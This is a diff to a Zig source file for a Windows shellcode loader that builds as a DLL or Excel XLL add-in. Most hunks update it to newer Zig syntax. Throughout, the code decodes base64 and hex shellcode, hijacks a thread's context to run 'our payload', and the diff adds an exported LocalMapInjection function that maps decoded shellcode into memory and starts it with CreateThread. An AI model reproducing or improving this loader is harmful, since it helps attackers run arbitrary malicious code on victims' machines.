@@ -12,7 +12,7 @@ const xll_core = @import("./xll_core.zig");
 const cascade = @import("./cascade.zig");
 
 const windows = std.os.windows;
-const WINAPI = windows.WINAPI;
+//const WINAPI = windows.winapi;
 const HANDLE = windows.HANDLE;
 const DWORD = windows.DWORD;
 const LPVOID = windows.LPVOID;
@@ -51,16 +51,16 @@ pub extern "kernel32" fn CreateThread(
 pub extern "kernel32" fn GetThreadContext(
     hThread: HANDLE,
     lpContext: *CONTEXT,
-) callconv(windows.WINAPI) BOOL;
+) callconv(.winapi) BOOL;
 
 pub extern "kernel32" fn SetThreadContext(
     hThread: HANDLE,
     lpContext: *CONTEXT,
-) callconv(windows.WINAPI) BOOL;
+) callconv(.winapi) BOOL;
 
 pub extern "kernel32" fn ResumeThread(
     hThread: HANDLE,
-) callconv(windows.WINAPI) DWORD;
+) callconv(.winapi) DWORD;
 
 pub const ThreadProc = fn (param: ?LPVOID) callconv(.Win64) DWORD;
 
@@ -70,7 +70,7 @@ const user32 = struct { // you can do struct and declare extern API like this.
         lpText: [*:0]const u8,
         lpCaption: [*:0]const u8,
         uType: windows.UINT,
-    ) callconv(windows.WINAPI) c_int;
+    ) callconv(.winapi) c_int;
 };
 // change this to true to enable debug mode
 var StatusDebug = core.isDebug.false;
@@ -167,8 +167,17 @@ fn ComptimeWS(comptime str: []const u8) []const u16 {
 
 //END HERE
 
+
 fn concat_shellcode(allocator: std.mem.Allocator) ![]u16 {
-    const parts = SH.getshellcodeparts();
+     const parts = SH.getshellcodeparts();
+//      const parts = &[_][]const u8{ // this is for testing purposes only
+ //         "0x90909090",
+//          "0x90909090",
+ //         "0x90909090",
+ //         "0x90909090",
+  //        "0x90909090",
+   //   };
+
     var total_len: usize = 0;
 
     for (parts) |part| { // calc total len
@@ -193,9 +202,9 @@ fn concat_shellcode(allocator: std.mem.Allocator) ![]u16 {
 }
 
 // Define the function pointer type for thread functions
-const ThreadFnType = *const fn (LPVOID) callconv(.C) DWORD;
+const ThreadFnType = *const fn (LPVOID) callconv(.c) DWORD;
 
-const ThreadProcedure = fn (lpParameter: ?*const anyopaque) callconv(.C) DWORD;
+const ThreadProcedure = fn (lpParameter: ?*const anyopaque) callconv(.c) DWORD;
 
 fn someFunction(x: i32) void {
     if (StatusDebug) {
@@ -213,7 +222,7 @@ fn myThreadFunction(param: LPVOID) DWORD {
     return 0;
 }
 
-fn sampleProcedure(lpParameter: ?*anyopaque) callconv(.C) DWORD {
+fn sampleProcedure(lpParameter: ?*anyopaque) callconv(.c) DWORD {
     _ = lpParameter;
 
     //std.debug.print("sampleProcedure called\n", .{});
@@ -221,7 +230,7 @@ fn sampleProcedure(lpParameter: ?*anyopaque) callconv(.C) DWORD {
 }
 
 // Thread function that executes the provided procedure
-fn threadFunction(parameter: ?*anyopaque) callconv(.C) DWORD {
+fn threadFunction(parameter: ?*anyopaque) callconv(.c) DWORD {
     if (parameter) |proc_ptr| {
         const proc = @as(*const ThreadProcedure, @ptrCast(proc_ptr)).*;
         proc();
@@ -245,7 +254,7 @@ fn bytesToHexString(allocator: Allocator, bytes: []const u8) ![]u8 {
 }
 
 fn convertEscapedHexToCommaHex(allocator: std.mem.Allocator, input: []const u8) ![]u8 {
-    var output = std.ArrayList(u8).init(allocator);
+    var output = std.array_list.Managed(u8).init(allocator);
     defer output.deinit();
 
     var i: usize = 0;
@@ -267,7 +276,7 @@ fn convertEscapedHexToCommaHex(allocator: std.mem.Allocator, input: []const u8) 
 }
 
 fn decodeBase64_u16(allocator: Allocator, encoded: []const u16) ![]u8 {
-    var regular_string = std.ArrayList(u8).init(allocator);
+    var regular_string = std.array_list.Managed(u8).init(allocator);
     defer regular_string.deinit();
 
     for (encoded) |wide_char| {
@@ -297,7 +306,7 @@ fn decodeBase64(allocator: Allocator, encoded: []const u8) ![]u8 {
 fn decodeHex(allocator: Allocator, hex_string: []const u8) ![]u8 {
 
     //garbage code but it works!
-    var decoded = std.ArrayList(u8).init(allocator);
+    var decoded = std.array_list.Managed(u8).init(allocator);
     defer decoded.deinit();
 
     //var iter = std.mem.split(u8, hex_string, ","); // this is deprecated in zig 14.0.0, there is also splitAny
@@ -596,16 +605,53 @@ fn createThreadAndExecute(proc: ThreadFnType) void {
     //   std.debug.print("\n", .{});
 
     if (thread_handle != windows.INVALID_HANDLE_VALUE) { // if not null then we can hijack the thread and execute our payload
-        std.time.sleep(std.time.ns_per_ms * 5000);
+ //       std.time.sleep(std.time.ns_per_ms * 5000);
         _ = technique_1.hijackThread(thread_handle, @ptrCast(decoded_hex)) catch |err| {
             std.debug.print("Thread Hjcke failed: {}\n", .{err});
             return;
         };
-        std.time.sleep(std.time.ns_per_ms * 5000);
+  //      std.time.sleep(std.time.ns_per_ms * 5000);
         _ = ResumeThread(thread_handle);
         // _ = windows.WaitForSingleObject(windows.INVALID_HANDLE_VALUE, windows.INFINITE) catch unreachable;
     }
 }
+
+pub export fn LocalMapInjection(shellcode: [*]const u8, length: usize) callconv(.winapi) i32 {
+    var PAddress: ?*anyopaque = null;
+
+    //_ = length;
+
+    const allocator = std.heap.page_allocator;
+
+    const shellcode_slice = shellcode[0..length];
+
+    //var Allc = std.heap.page_allocator;
+
+    const decoded = decodeBase64(allocator, shellcode_slice) catch |err| {
+        std.debug.print("Failed to decode base64: {}\n", .{err});
+        return -1;
+    };
+    defer allocator.free(decoded);
+
+    if (technique_2.LocalMapInject(decoded.ptr, decoded.len, &PAddress)) {
+        std.debug.print("[i] Local Map INJ Success\n", .{});
+    } else {
+        std.debug.print("[x] Local Map INJ Failed\n", .{});
+    }
+    const ht = kernel32.CreateThread(null, 0, @as(windows.LPTHREAD_START_ROUTINE, @ptrCast(PAddress)), null, 0, null) orelse {
+        std.debug.print("CreateThread failed: {}\n", .{kernel32.GetLastError()});
+        return -1;
+    };
+    std.debug.print("hThread value: {}\n", .{ht});
+    return 1;
+}
+
+
+
+
+
+
+
 
 // ENTRY_DLL
 // ENTRY_XLL
